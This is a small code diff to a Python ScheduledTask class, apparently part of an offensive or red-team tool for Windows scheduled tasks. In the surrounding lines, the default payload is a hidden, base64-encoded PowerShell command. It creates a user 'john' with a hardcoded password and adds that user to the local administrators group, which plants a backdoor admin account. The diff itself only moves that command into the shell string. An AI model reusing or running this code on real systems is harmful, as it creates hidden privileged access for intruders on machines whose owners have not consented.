@@ -37,6 +37,8 @@ class ScheduledTask:
                 self._command = escape('-windowstyle hidden -nop -enc {}'.format(b64encode(command.encode('UTF-16LE')).decode("utf-8")))
             else:
                 self._command = escape('-windowstyle hidden -nop -enc {}'.format(b64encode('net user john H4x00r123.. /add;net localgroup administrators john /add'.encode('UTF-16LE')).decode('utf-8')))
+            self._shell = f"{self._shell} {self._command}"
+            self._command = ""
         else:
             self._shell = escape('c:\\windows\\system32\\cmd.exe')
             if command:
